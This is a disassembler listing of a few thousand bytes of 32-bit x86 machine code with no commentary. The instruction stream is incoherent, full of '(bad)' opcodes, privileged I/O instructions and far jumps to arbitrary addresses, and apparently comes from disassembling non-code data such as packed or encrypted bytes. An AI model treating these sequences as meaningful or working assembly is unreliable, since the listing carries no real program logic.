  41d937:	dec    esp
  41d938:	iret   
  41d939:	sbb    ebx,DWORD PTR [esi+0x5efdf55a]
  41d93f:	xor    al,0xaf
  41d941:	ds adc edi,eax
  41d944:	gs push cs
  41d946:	jle    0x41d932
  41d948:	jns    0x41d95c
  41d94a:	dec    edx
  41d94b:	lds    ebp,FWORD PTR [ebp+0x6c]
  41d94e:	sub    cl,BYTE PTR [edx-0x2b]
  41d951:	ins    DWORD PTR es:[edi],dx
  41d952:	and    DWORD PTR [ecx+eax*1],0x55
  41d956:	aas    
  41d957:	or     eax,0xb865f146
  41d95c:	or     DWORD PTR [ebx-0x55],esp
  41d95f:	xor    ch,ah
  41d961:	push   0x666cd18f
  41d966:	pushf  
  41d967:	jno    0x41d925
  41d969:	(bad)  
  41d96b:	ja     0x41d9d8
  41d96d:	dec    ebx
  41d96e:	cmc    
  41d96f:	dec    esi
  41d970:	or     DWORD PTR [ecx-0x6f],eax
  41d973:	jo     0x41d9a2
  41d975:	loopne 0x41d9c4
  41d977:	out    dx,al
  41d978:	push   ebx
  41d979:	idiv   ecx
  41d97b:	les    esp,FWORD PTR [ebx+0x625ceb62]
  41d981:	push   edx
  41d982:	fisub  DWORD PTR [eax-0x11e13163]
  41d988:	or     eax,0xdb87f66c
  41d98d:	imul   esp,DWORD PTR [eax],0x5c193059
  41d993:	pop    esi
  41d994:	shl    BYTE PTR [eax],1
  41d996:	cmp    dh,BYTE PTR [edi-0x32]
  41d999:	dec    ebp
  41d99a:	fld    TBYTE PTR ds:0xf0930c53
  41d9a0:	push   0x2e
  41d9a2:	push   edi
  41d9a3:	fistp  DWORD PTR [esi-0x4802d9c1]
  41d9a9:	outs   dx,BYTE PTR ds:[esi]
  41d9aa:	js     0x41d9b0
  41d9ac:	jno    0x41da05
  41d9ae:	xchg   ebx,eax
  41d9af:	ret    
  41d9b0:	stc    
  41d9b1:	cld    
  41d9b2:	add    dl,dh
  41d9b4:	xor    eax,0xc32ff006
  41d9b9:	frstor [ebx+0x37]
  41d9bc:	test   esi,edi
  41d9be:	and    BYTE PTR [si],dl
  41d9c1:	ret    0x8bc8
  41d9c4:	or     BYTE PTR ds:0xad52c8bc,0x24
  41d9cb:	mov    ds:0xd6ec0b0d,al
  41d9d0:	mov    bl,0xfd
  41d9d2:	test   BYTE PTR [ebp-0x9],bh
  41d9d5:	jne    0x41d96a
  41d9d7:	fild   WORD PTR [esi-0x26f73ac9]
  41d9dd:	bnd jno 0x41da3f
  41d9e0:	inc    esi
  41d9e1:	push   ss
  41d9e2:	popf   
  41d9e3:	imul   esp,edx,0xa592c497
  41d9e9:	mov    bl,0x6a
  41d9eb:	push   ds
  41d9ec:	push   cs
  41d9ed:	or     cl,0xc9
  41d9f0:	jae    0x41da60
  41d9f2:	arpl   sp,bx
  41d9f4:	and    al,0xe5
  41d9f6:	push   0xa0abd730
  41d9fb:	add    ch,ah
  41d9fd:	mov    dh,0x1
  41d9ff:	data16 (bad) [ecx+ebx*8-0x4e]
  41da04:	retf   
  41da05:	cmp    ebx,esp
  41da07:	inc    edx
  41da08:	hlt    
  41da09:	out    dx,al
  41da0a:	call   0x9195:0x76dff7b6
  41da11:	dec    ecx
  41da12:	shl    BYTE PTR [esi-0x531ae927],cl
  41da18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da19:	aam    0x62
  41da1b:	jns    0x41da5a
  41da1d:	xor    al,0xe8
  41da1f:	les    esp,FWORD PTR [eax+0x70ebf9b2]
  41da25:	jno    0x41d9fc
  41da27:	add    BYTE PTR [ebp-0x3cdf0cdf],dl
  41da2d:	pushf  
  41da2e:	inc    eax
  41da2f:	fisttp WORD PTR [ebx+0x1abba514]
  41da35:	outs   dx,BYTE PTR ds:[esi]
  41da36:	hlt    
  41da37:	cmp    al,0xf7
  41da39:	cdq    
  41da3a:	loopne 0x41da0d
  41da3c:	pop    edi
  41da3d:	retf   0x5342
  41da40:	add    eax,0x9f2db054
  41da45:	dec    eax
  41da46:	cmp    eax,0x430db9b1
  41da4b:	fucom  st(7)
  41da4d:	cmp    BYTE PTR [edx-0x27],ah
  41da50:	out    0x60,al
  41da52:	adc    BYTE PTR [eax],0xdb
  41da55:	stos   BYTE PTR es:[edi],al
  41da56:	fldl2e 
  41da58:	sahf   
  41da59:	inc    eax
  41da5a:	push   eax
  41da5b:	ret    0x65bb
  41da5e:	add    BYTE PTR [esp+edx*1+0x27536c67],cl
  41da65:	fs cmp al,0x38
  41da68:	pop    edx
  41da69:	gs sbb al,ch
  41da6c:	add    ah,al
  41da6e:	cmp    edi,DWORD PTR [ebp-0x50c5655c]
  41da74:	jo     0x41da15
  41da76:	pop    esi
  41da77:	mov    ch,0x30
  41da79:	not    BYTE PTR [esi+0x403362f6]
  41da7f:	(bad)  ds:0xc33f4bf0
  41da85:	and    DWORD PTR [ecx],esi
  41da87:	jnp    0x41dad7
  41da89:	out    dx,eax
  41da8a:	idiv   DWORD PTR [edx+0x5c]
  41da8d:	adc    al,0xa
  41da8f:	fs add edx,ebx
  41da92:	pop    eax
  41da93:	sub    eax,0xe2b65f38
  41da98:	inc    ebp
  41da99:	je     0x41da43
  41da9b:	dec    esp
  41da9c:	sbb    eax,esi
  41da9e:	leave  
  41da9f:	shl    BYTE PTR [edi-0x1d428dbc],1
  41daa5:	cmp    al,BYTE PTR [ebp+0x288b1075]
  41daab:	clc    
  41daac:	es xchg edi,eax
  41daae:	inc    DWORD PTR [ecx-0x79]
  41dab1:	fnstcw WORD PTR [esi+0x33]
  41dab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dab5:	xchg   edi,eax
  41dab6:	addr16 cs into 
  41dab9:	sub    al,0xb2
  41dabb:	xchg   esi,eax
  41dabc:	or     ebp,edx
  41dabe:	adc    al,0xa7
  41dac0:	idiv   DWORD PTR [esi+0x54]
  41dac3:	mov    eax,ds:0xa928ca31
  41dac8:	imul   edi,DWORD PTR [ebx+0x714e50dd],0x6bef3fa4
  41dad2:	jg     0x41db14
  41dad4:	ss leave 
  41dad6:	fisub  DWORD PTR [ebx-0x206edb77]
  41dadc:	js     0x41da8b
  41dade:	add    dh,BYTE PTR [ebx+eax*2-0x57]
  41dae2:	aas    
  41dae3:	inc    ecx
  41dae4:	rcl    DWORD PTR [ecx+0x69],cl
  41dae7:	mov    ds:0xd06e0830,al
  41daec:	nop
  41daed:	adc    DWORD PTR [edx+esi*1-0x14fce221],esp
  41daf4:	pop    ebx
  41daf5:	test   al,0x55
  41daf7:	out    0x33,eax
  41daf9:	or     DWORD PTR [ecx],0x810878e2
  41daff:	dec    esp
  41db00:	mov    ebx,0x18a4bc80
  41db05:	pop    esp
  41db06:	pop    esi
  41db07:	pop    edi
  41db08:	dec    esp
  41db09:	inc    ebp
  41db0a:	xchg   DWORD PTR [edi+ebx*8-0x70],ebp
  41db0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db0f:	dec    ecx
  41db10:	lock nop
  41db12:	add    ecx,DWORD PTR [ebp-0x71]
  41db15:	push   ebp
  41db16:	imul   edi,DWORD PTR [ebp-0x5],0x1c
  41db1a:	and    eax,0x6c7cbe44
  41db1f:	push   edi
  41db20:	xlat   BYTE PTR ds:[ebx]
  41db21:	mov    esi,0xbb0c01b3
  41db26:	jg     0x41db45
  41db28:	sbb    eax,DWORD PTR [ebp+0xa074170]
  41db2e:	xor    BYTE PTR [esi],dl
  41db30:	pop    ecx
  41db31:	push   cs
  41db32:	cmp    BYTE PTR [edx+0x78],ch
  41db35:	out    dx,eax
  41db36:	(bad)  
  41db38:	or     dl,dh
  41db3a:	mov    ds:0x4a4ec9e0,al
  41db3f:	ja     0x41db76
  41db41:	push   cs
  41db42:	lahf   
  41db43:	aaa    
  41db44:	sub    edx,DWORD PTR [edx-0x12358f7a]
  41db4a:	(bad)  [esi]
  41db4c:	outs   dx,DWORD PTR ds:[esi]
  41db4d:	or     al,0x8
  41db4f:	adc    cl,bh
  41db51:	js     0x41dade
  41db53:	sub    al,0xdb
  41db55:	mov    dh,0x45
  41db57:	pusha  
  41db58:	rcr    BYTE PTR [ebp+esi*2-0x5f1e7591],0x87
  41db60:	test   edx,eax
  41db62:	dec    ebx
  41db63:	or     dl,BYTE PTR [esi]
  41db65:	scas   al,BYTE PTR es:[edi]
  41db66:	es pop ds
  41db68:	adc    BYTE PTR [ebp-0x13],0xf5
  41db6c:	mov    ebx,0x51a91a41
  41db71:	mov    dh,0x76
  41db73:	sub    eax,0x4387394e
  41db78:	sbb    BYTE PTR [ebp-0xa],cl
  41db7b:	jns    0x41db71
  41db7d:	or     ah,bh
  41db7f:	arpl   WORD PTR [edx],si
  41db81:	dec    eax
  41db82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db83:	ss das 
  41db85:	mov    ah,0x36
  41db87:	push   ebp
  41db88:	out    0x8a,eax
  41db8a:	sbb    DWORD PTR [edi-0x50c1380c],eax
  41db90:	mov    edi,0x213a2b6c
  41db95:	ja     0x41db2a
  41db97:	in     al,dx
  41db98:	in     eax,dx
  41db99:	mov    bh,0x1e
  41db9b:	shr    DWORD PTR [edi+ebp*4+0x1b],cl
  41db9f:	fbld   TBYTE PTR [esp+ebx*4-0x71bd4c1a]
  41dba6:	shr    BYTE PTR [ecx-0x3],1
  41dba9:	inc    eax
  41dbaa:	sahf   
  41dbab:	addr16 (bad) 
  41dbad:	lock imul eax,ebp,0xffffff85
  41dbb1:	popf   
  41dbb2:	mov    ss,eax
  41dbb4:	fiadd  WORD PTR [edx+0x8]
  41dbb7:	gs jbe 0x41dbb2
  41dbba:	adc    ecx,edi
  41dbbc:	cs retf 0xe7e2
  41dbc0:	bound  eax,QWORD PTR [edi+0x66]
  41dbc3:	pushf  
  41dbc4:	shl    BYTE PTR [edx+ebx*1+0x25409011],cl
  41dbcb:	pop    edi
  41dbcc:	dec    eax
  41dbcd:	fiadd  WORD PTR [edx]
  41dbcf:	and    al,BYTE PTR [ebp+0x66]
  41dbd2:	mov    eax,ds:0xcd286ad1
  41dbd7:	scas   eax,DWORD PTR es:[edi]
  41dbd8:	sub    BYTE PTR [esi],dl
  41dbda:	shl    BYTE PTR [esi],0x93
  41dbdd:	push   ecx
  41dbde:	add    ch,cl
  41dbe0:	add    BYTE PTR [esi],0x1a
  41dbe3:	add    esi,DWORD PTR [ebp-0x4e]
  41dbe6:	outs   dx,BYTE PTR ds:[esi]
  41dbe7:	add    eax,0x41c36409
  41dbec:	cmp    dh,ah
  41dbee:	daa    
  41dbef:	loope  0x41dbf6
  41dbf1:	pop    esi
  41dbf2:	and    ecx,DWORD PTR fs:[edi]
  41dbf5:	fimul  WORD PTR [eax+0x48]
  41dbf8:	es sbb eax,0x47c974b8
  41dbfe:	jno    0x41dc0e
  41dc00:	cmpxchg DWORD PTR [eax],esp
  41dc03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc04:	jge    0x41dc85
  41dc06:	mov    ebp,0x91848143
  41dc0b:	aam    0x81
  41dc0d:	or     edi,DWORD PTR [edx]
  41dc0f:	pop    ebx
  41dc10:	ins    BYTE PTR es:[edi],dx
  41dc11:	add    edi,0x79
  41dc14:	iret   
  41dc15:	test   eax,0xd6caa4ed
  41dc1a:	call   0x69ae:0x25298628
  41dc21:	pop    ds
  41dc22:	repz (bad) 
  41dc24:	fistp  QWORD PTR [ecx-0x65]
  41dc27:	push   ebx
  41dc28:	popf   
  41dc29:	cwde   
  41dc2a:	sbb    esi,ebp
  41dc2c:	clc    
  41dc2d:	mov    ebx,0x86fbb0f5
  41dc32:	cli    
  41dc33:	das    
  41dc34:	push   edx
  41dc35:	sbb    al,BYTE PTR [edx+ecx*4+0x7ff269]
  41dc3c:	lods   al,BYTE PTR ds:[esi]
  41dc3d:	push   ds
  41dc3e:	push   ebp
  41dc3f:	push   edi
  41dc40:	iret   
  41dc41:	xlat   BYTE PTR ds:[ebx]
  41dc42:	push   ss
  41dc43:	call   DWORD PTR [edx]
  41dc45:	stos   DWORD PTR es:[edi],eax
  41dc46:	fsub   QWORD PTR [ecx]
  41dc48:	mov    edi,0xf7bc52d8
  41dc4d:	and    edi,DWORD PTR [edx]
  41dc4f:	push   esi
  41dc50:	sahf   
  41dc51:	pushf  
  41dc52:	xchg   edi,eax
  41dc53:	mov    ecx,0x1a6a8b6e
  41dc58:	loope  0x41dc45
  41dc5a:	test   eax,0x89aebaf1
  41dc5f:	(bad)  
  41dc60:	dec    edx
  41dc61:	clc    
  41dc62:	jo     0x41dc10
  41dc64:	xchg   edi,eax
  41dc65:	mov    edi,0xf5c7117
  41dc6a:	idiv   BYTE PTR [ebp+0x59]
  41dc6d:	xchg   ecx,eax
  41dc6e:	cdq    
  41dc6f:	add    edx,ecx
  41dc71:	mov    WORD PTR [ebx+0x7b],ds
  41dc74:	sti    
  41dc75:	xchg   BYTE PTR [edi-0x43],cl
  41dc78:	aam    0xab
  41dc7a:	into   
  41dc7b:	inc    ebp
  41dc7c:	adc    edx,ebp
  41dc7e:	xor    dh,BYTE PTR [esi+0x3031958f]
  41dc84:	into   
  41dc85:	dec    esi
  41dc86:	push   ebx
  41dc87:	hlt    
  41dc88:	mov    dh,0x6
  41dc8a:	xchg   ebx,eax
  41dc8b:	dec    ecx
  41dc8c:	jbe    0x41dc54
  41dc8e:	icebp  
  41dc8f:	int3   
  41dc90:	retf   
  41dc91:	ret    0x6156
  41dc94:	sbb    ebp,edi
  41dc96:	jno    0x41dc5a
  41dc98:	out    dx,al
  41dc99:	(bad)  
  41dc9a:	loop   0x41dc2e
  41dc9c:	push   ecx
  41dc9d:	mov    al,BYTE PTR [ecx+0x5b]
  41dca0:	ror    BYTE PTR [ebx-0x488cf8de],1
  41dca6:	rol    BYTE PTR [eax+0xcaf0fe0],1
  41dcac:	scas   eax,DWORD PTR es:[edi]
  41dcad:	push   ebp
  41dcae:	xor    ebp,edi
  41dcb0:	dec    cx
  41dcb2:	out    0x6c,eax
  41dcb4:	mov    dh,0x1f
  41dcb6:	add    bh,BYTE PTR [bp+0x555e]
  41dcbb:	mov    dh,0xc3
  41dcbd:	inc    eax
  41dcbe:	lods   al,BYTE PTR ds:[esi]
  41dcbf:	(bad)  
  41dcc0:	push   esp
  41dcc1:	cmp    BYTE PTR [edi],dl
  41dcc3:	hlt    
  41dcc4:	stos   BYTE PTR es:[edi],al
  41dcc5:	mov    edx,0xf2e2bba9
  41dcca:	inc    edi
  41dccb:	cmp    al,0x34
  41dccd:	push   ebp
  41dcce:	xor    esi,ebp
  41dcd0:	sahf   
  41dcd1:	shl    BYTE PTR ds:0xb40ae130,cl
  41dcd7:	dec    edx
  41dcd8:	adc    DWORD PTR [di+0x5543],esp
  41dcdd:	repz or bh,dl
  41dce0:	ret    
  41dce1:	aas    
  41dce2:	pushf  
  41dce3:	in     eax,dx
  41dce4:	adc    al,BYTE PTR [ebx-0x7c]
  41dce7:	adc    al,0xb3
  41dce9:	pusha  
  41dcea:	retf   
  41dceb:	xor    DWORD PTR [ebp+0x55],esi
  41dcee:	xchg   edx,eax
  41dcef:	jnp    0x41dcb3
  41dcf1:	sahf   
  41dcf2:	pop    edi
  41dcf3:	std    
  41dcf4:	jne    0x41dce0
  41dcf6:	test   BYTE PTR [edx+0x75],al
  41dcf9:	icebp  
  41dcfa:	jmp    0x41dd34
  41dcfc:	popa   
  41dcfd:	and    DWORD PTR [edx-0x36],0xa741241a
  41dd04:	mov    ch,0x53
  41dd06:	sar    BYTE PTR [edi+0x52],cl
  41dd09:	pusha  
  41dd0a:	push   ecx
  41dd0b:	mov    ecx,0xf4f12dbe
  41dd10:	cld    
  41dd11:	push   cs
  41dd12:	add    esi,ebp
  41dd14:	js     0x41dd76
  41dd16:	mov    dl,BYTE PTR [eax-0x7f2c06eb]
  41dd1c:	pop    edx
  41dd1d:	mov    ah,0xc2
  41dd1f:	cmp    ebp,eax
  41dd21:	dec    ebx
  41dd22:	dec    esp
  41dd23:	add    eax,0xf7b7d35e
  41dd28:	pop    edx
  41dd29:	imul   edi,DWORD PTR [edx-0x78],0x4f11a3ca
  41dd30:	outs   dx,DWORD PTR ds:[esi]
  41dd31:	add    DWORD PTR [edi],eax
  41dd33:	xor    al,0xeb
  41dd35:	cmp    DWORD PTR cs:[eax+0x6dfb64d1],eax
  41dd3c:	and    al,BYTE PTR [edx]
  41dd3e:	mov    ebx,0xf6517c47
  41dd43:	cmp    edi,DWORD PTR [esi+0x5edc2f89]
  41dd49:	and    ebx,edi
  41dd4b:	adc    BYTE PTR [eax+0x6024386],ch
  41dd51:	cld    
  41dd52:	jp     0x41dcd6
  41dd54:	mov    edi,0xd6d0b7b7
  41dd59:	sbb    ah,al
  41dd5b:	mov    esi,0x3597a12a
  41dd60:	inc    eax
  41dd61:	xchg   esi,eax
  41dd62:	aam    0xae
  41dd64:	shr    DWORD PTR [eax+eiz*2-0x1c],1
  41dd68:	push   eax
  41dd69:	mov    dl,0x15
  41dd6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd6c:	dec    ecx
  41dd6d:	or     eax,0xd2a5b5fa
  41dd72:	pop    es
  41dd73:	or     BYTE PTR [ecx-0x64c2b5fb],dl
  41dd79:	jmp    0x5951b85a
  41dd7e:	pop    edx
  41dd7f:	lahf   
  41dd80:	imul   eax,DWORD PTR [edx-0x2e2f620],0x3c
  41dd87:	test   DWORD PTR [eax-0x36],0x3eb829d
  41dd8e:	inc    ebx
  41dd8f:	sbb    ecx,DWORD PTR [eax]
  41dd91:	nop
  41dd92:	repz and al,0xc0
  41dd95:	adc    BYTE PTR [ecx+0xfa9163a],bh
  41dd9b:	push   ecx
  41dd9c:	psrlw  mm6,QWORD PTR [ebx]
  41dd9f:	fcomi  st,st(1)
  41dda1:	push   edx
  41dda2:	je     0x41de1f
  41dda4:	out    0x58,eax
  41dda6:	stc    
  41dda7:	sub    eax,0x1bbc6264
  41ddac:	or     ah,BYTE PTR [eax]
  41ddae:	outs   dx,BYTE PTR ds:[esi]
  41ddaf:	push   cx
  41ddb1:	(bad)  
  41ddb2:	xchg   ebx,eax
  41ddb3:	mov    ch,0x8a
  41ddb5:	lods   al,BYTE PTR gs:[esi]
  41ddb7:	jnp    0x41dd94
  41ddb9:	hlt    
  41ddba:	out    dx,eax
  41ddbb:	adc    BYTE PTR [ecx],0xd6
  41ddbe:	mov    WORD PTR ds:0x97048a6f,es
  41ddc4:	sar    BYTE PTR [edi-0x5535d79d],0xc3
  41ddcb:	cdq    
  41ddcc:	mov    cl,0xd1
  41ddce:	retf   0x782c
  41ddd1:	aaa    
  41ddd2:	jnp    0x41de22
  41ddd4:	sub    DWORD PTR [ebp+0x6261d587],eax
  41ddda:	or     BYTE PTR [esi-0x36aaa6fc],bh
  41dde0:	aaa    
  41dde1:	xchg   cl,bl
  41dde3:	les    ebp,FWORD PTR gs:[ebx+0x4e152c4d]
  41ddea:	jmp    0x7987facb
  41ddef:	das    
  41ddf0:	(bad)  
  41ddf1:	and    eax,DWORD PTR [edi]
  41ddf3:	cmp    ah,BYTE PTR [ebx+eax*1-0x3f]
  41ddf7:	pop    ebx
  41ddf8:	(bad)  
  41ddf9:	into   
  41ddfa:	adc    edx,DWORD PTR [esi+0x4379fc14]
  41de00:	cmp    al,0x17
  41de02:	mov    dh,0x4d
  41de04:	retf   
  41de05:	ret    0x2476
  41de08:	mov    ch,0x47
  41de0a:	sbb    bl,BYTE PTR [esi]
  41de0c:	shl    BYTE PTR [edi+0x73],cl
  41de0f:	fisub  WORD PTR [edx]
  41de11:	push   ebx
  41de12:	popa   
  41de13:	inc    edx
  41de14:	lods   eax,DWORD PTR ds:[esi]
  41de15:	sub    al,BYTE PTR [esi+edx*2]
  41de18:	out    dx,eax
  41de19:	es inc esi
  41de1b:	mov    BYTE PTR [esi-0x54d530c7],ah
  41de21:	dec    ebx
  41de22:	lods   eax,DWORD PTR ds:[esi]
  41de23:	and    eax,0x8b6809d6
  41de28:	jmp    0x41dea7
  41de2a:	jo     0x41ddad
  41de2c:	mov    ah,0x39
  41de2e:	in     al,dx
  41de2f:	lea    ebp,[ebp-0x271025d]
  41de35:	xchg   DWORD PTR [ecx+0x35],edx
  41de38:	jecxz  0x41de90
  41de3a:	push   ds
  41de3b:	push   ds
  41de3c:	shr    esi,cl
  41de3e:	mov    ecx,0x221edca0
  41de43:	es xchg ecx,eax
  41de45:	enter  0xc2d2,0x6f
  41de49:	stc    
  41de4a:	fstp   st(4)
  41de4c:	in     al,0x44
  41de4e:	ficomp DWORD PTR [ebx]
  41de50:	sub    eax,DWORD PTR [ebp-0x13]
  41de53:	xchg   BYTE PTR [esi],ch
  41de55:	fmul   st(5),st
  41de57:	mov    cl,0x2c
  41de59:	xor    BYTE PTR [esi+ebp*2],al
  41de5c:	ins    DWORD PTR es:[edi],dx
  41de5d:	pop    ebp
  41de5e:	data16 xor al,BYTE PTR [ecx-0x55]
  41de62:	repz push ecx
  41de64:	stos   DWORD PTR es:[edi],eax
  41de65:	sahf   
  41de66:	dec    edi
  41de67:	jns    0x41de00
  41de69:	pop    esi
  41de6a:	pop    esi
  41de6b:	sbb    ch,BYTE PTR [eax-0x5d90b684]
  41de71:	mov    ch,0x52
  41de73:	ficomp WORD PTR [edx]
  41de75:	xor    DWORD PTR [eax],ecx
  41de77:	add    bl,BYTE PTR [eax-0x64813c82]
  41de7d:	inc    esp
  41de7e:	jle    0x41de23
  41de80:	or     ecx,DWORD PTR [edi-0x4a]
  41de83:	jl     0x41de05
  41de85:	addr16 and al,bh
  41de88:	int3   
  41de89:	xchg   BYTE PTR [ecx+esi*8],cl
  41de8c:	call   0x6e9a:0x96aebdc8
  41de93:	mov    WORD PTR [ecx+0x1c],cs
  41de96:	cmp    bl,BYTE PTR [ebp-0x7844c4cd]
  41de9c:	pop    eax
  41de9d:	xor    esi,DWORD PTR [esi]
  41de9f:	xchg   esp,eax
  41dea0:	add    dh,bl
  41dea2:	adc    dh,BYTE PTR [edx]
  41dea4:	dec    ecx
  41dea5:	(bad)  
  41dea6:	mov    edx,0x2ae86e10
  41deab:	stc    
  41deac:	popa   
  41dead:	aad    0x8d
  41deaf:	(bad)  
  41deb1:	xchg   edx,eax
  41deb2:	inc    eax
  41deb3:	shl    BYTE PTR [edi-0x4e],1
  41deb6:	and    ch,dl
  41deb8:	or     bl,BYTE PTR cs:[esi]
  41debb:	cmp    al,0x2
  41debd:	loope  0x41dec6
  41debf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dec0:	push   ss
  41dec1:	dec    ebp
  41dec2:	sbb    BYTE PTR [eax-0x2c],cl
  41dec5:	stc    
  41dec6:	sar    ebx,0x9
  41dec9:	mov    bl,0x90
  41decb:	inc    eax
  41decc:	mov    ebx,0xfaf958e9
  41ded1:	add    bl,BYTE PTR [edi-0x1c]
  41ded4:	mov    eax,ds:0xe09148b9
  41ded9:	mov    bh,0x45
  41dedb:	jne    0x41deb1
  41dedd:	fdiv   QWORD PTR [ebx+0x56]
  41dee0:	pusha  
  41dee1:	jmp    FWORD PTR [esi+0x32]
  41dee4:	pop    es
  41dee5:	mov    al,ds:0xa591ba11
  41deea:	jnp    0x41df4e
  41deec:	or     BYTE PTR [ebp+0x83dc3f0],0xe
  41def3:	sahf   
  41def4:	out    0x14,eax
  41def6:	pop    ebp
  41def7:	pop    es
  41def8:	es push 0x4de31eee
  41defe:	push   ds
  41deff:	mov    eax,0xdf7932be
  41df04:	sub    bh,al
  41df06:	je     0x41df1e
  41df08:	pop    ebx
  41df09:	ret    
  41df0a:	retf   0x622e
  41df0d:	scas   eax,DWORD PTR es:[edi]
  41df0e:	shr    BYTE PTR [ecx],cl
  41df10:	test   eax,0xd9f887dd
  41df15:	jl     0x41df7d
  41df17:	push   edi
  41df18:	jmp    0x5a93a775
  41df1d:	fwait
  41df1e:	jne    0x41df9e
  41df20:	aam    0xec
  41df22:	cmp    eax,0xdfd2100
  41df27:	push   edi
  41df28:	adc    dh,ah
  41df2a:	mov    ds:0x40eb4619,al
  41df2f:	faddp  st(1),st
  41df31:	sbb    eax,0x8469eee7
  41df36:	jne    0x41dece
  41df38:	xor    ecx,DWORD PTR ss:[esi-0x46]
  41df3c:	pop    eax
  41df3d:	sub    cl,dh
  41df3f:	mov    ch,0x46
  41df41:	mov    cl,0xcb
  41df43:	xchg   edi,eax
  41df44:	stos   DWORD PTR es:[edi],eax
  41df45:	xchg   esp,eax
  41df46:	xor    DWORD PTR [edi+0x1d],eax
  41df49:	ja     0x41df2d
  41df4b:	add    BYTE PTR [edi-0x75eaa765],al
  41df51:	outs   dx,BYTE PTR ds:[esi]
  41df52:	or     BYTE PTR [ecx-0x23],ch
  41df55:	adc    al,0xe8
  41df57:	xchg   esp,eax
  41df58:	std    
  41df59:	sub    eax,0x56e38685
  41df5e:	inc    esi
  41df5f:	cmc    
  41df60:	fst    st(4)
  41df62:	sbb    al,0x64
  41df64:	pop    ss
  41df65:	mul    BYTE PTR [edx+0x5c]
  41df68:	dec    esp
  41df69:	mov    esi,0x6e8969f3
  41df6e:	(bad)  
  41df6f:	dec    ebp
  41df70:	xlat   BYTE PTR ds:[ebx]
  41df71:	mov    ds:0xe5165326,eax
  41df76:	cmc    
  41df77:	retf   0x2f93
  41df7a:	sbb    al,BYTE PTR [edi+0x1b513cc1]
  41df80:	pop    ebp
  41df81:	push   esp
  41df82:	adc    BYTE PTR [esi+ebp*1+0x7e5de69d],ah
  41df89:	mov    edi,0x4b4da505
  41df8e:	aam    0x64
  41df90:	popf   
  41df91:	mov    ds:0x221490fc,eax
  41df96:	cli    
  41df97:	cmp    bh,BYTE PTR [edi+edi*2]
  41df9a:	sub    al,0xa1
  41df9c:	imul   ebp,ebp,0x1e
  41df9f:	jl     0x41df73
  41dfa1:	pushf  
  41dfa2:	sub    eax,0xa1aef1c5
  41dfa7:	shl    BYTE PTR [edi-0x50220e38],0xff
  41dfae:	mov    ebx,0xebb66194
  41dfb3:	je     0x41dfee
  41dfb5:	adc    BYTE PTR ds:0x87a95da2,ah
  41dfbb:	fmul   st(1),st
  41dfbd:	lock popa 
  41dfbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfc0:	in     al,dx
  41dfc1:	imul   ecx,esi,0x29658711
  41dfc7:	(bad)  
  41dfc8:	pop    edi
  41dfc9:	in     al,0x61
  41dfcb:	out    dx,eax
  41dfcc:	mov    eax,ds:0x954e6386
  41dfd1:	mov    eax,0xcf95d5b
  41dfd6:	xor    al,0xa3
  41dfd8:	add    al,0xf1
  41dfda:	ret    0x5c66
  41dfdd:	out    dx,eax
  41dfde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfdf:	dec    edx
  41dfe0:	int    0x53
  41dfe2:	mov    bl,0x7c
  41dfe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfe5:	stos   DWORD PTR es:[edi],eax
  41dfe6:	fisub  DWORD PTR [ecx+0x10cc1ef7]
  41dfec:	out    0xce,eax
  41dfee:	(bad)  
  41dff0:	mov    esi,DWORD PTR [esi+0x4b15ee3a]
  41dff6:	xor    DWORD PTR [edi+0x52028e0e],edx
  41dffc:	sub    BYTE PTR [ecx-0x521c8b3c],dh
  41e002:	mov    cl,0xaf
  41e004:	(bad)  
  41e005:	loope  0x41e022
  41e007:	bound  edx,QWORD PTR [eax]
  41e009:	shl    DWORD PTR [ecx+0x55cc351c],1
  41e00f:	or     al,0x74
  41e011:	loope  0x41e074
  41e013:	or     BYTE PTR [edi+0x3b],dl
  41e016:	test   ch,bh
  41e018:	sbb    DWORD PTR [edx-0xee09f99],edx
  41e01e:	jecxz  0x41e046
  41e020:	leave  
  41e021:	test   BYTE PTR [ecx-0x45194d24],ah
  41e027:	mov    edx,0xaf106ae9
  41e02c:	dec    ebx
  41e02d:	test   eax,0x2b77a4d
  41e032:	inc    eax
  41e033:	loop   0x41dfba
  41e035:	rcl    DWORD PTR [eax],cl
  41e037:	pop    ebp
  41e038:	(bad)  
  41e039:	jbe    0x41e033
  41e03b:	cmp    BYTE PTR [edx+0x2a],0xc7
  41e03f:	test   bl,bh
  41e041:	pop    ebx
  41e042:	daa    
  41e043:	xor    edx,DWORD PTR [edi+0x3f]
  41e046:	sbb    eax,0x14c80a2c
  41e04b:	(bad)  
  41e04c:	inc    esp
  41e04d:	(bad)  
  41e04e:	call   0xbad1:0xef132015
  41e055:	bnd jmp 0x4ec6c9df
  41e05b:	lahf   
  41e05c:	and    al,0xe2
  41e05e:	call   0x9f41adc1
  41e063:	aam    0xf5
  41e065:	scas   eax,DWORD PTR es:[edi]
  41e066:	jns    0x41e066
  41e068:	pop    esp
  41e069:	int    0xd1
  41e06b:	inc    edi
  41e06c:	push   ecx
  41e06d:	push   esi
  41e06e:	and    dh,cl
  41e070:	dec    esi
  41e071:	jmp    0x41e0d0
  41e073:	inc    esi
  41e074:	rcl    BYTE PTR fs:[esi-0x10],cl
  41e078:	jmp    0x8213137d
  41e07d:	test   DWORD PTR [edi],edi
  41e07f:	or     eax,DWORD PTR [edi]
  41e081:	test   BYTE PTR [ebx+0x16],cl
  41e084:	stos   DWORD PTR es:[edi],eax
  41e085:	sub    esp,DWORD PTR [esi+ebx*4]
  41e088:	inc    ecx
  41e089:	and    al,0x8b
  41e08b:	sbb    DWORD PTR [esi],0x26
  41e08e:	ss mov ch,al
  41e091:	or     edi,edi
  41e093:	xchg   edi,eax
  41e094:	dec    ecx
  41e095:	retf   
  41e096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e097:	out    dx,al
  41e098:	repnz mov ds:0xe15e55eb,al
  41e09e:	or     ch,BYTE PTR [edx-0x6e]
  41e0a1:	das    
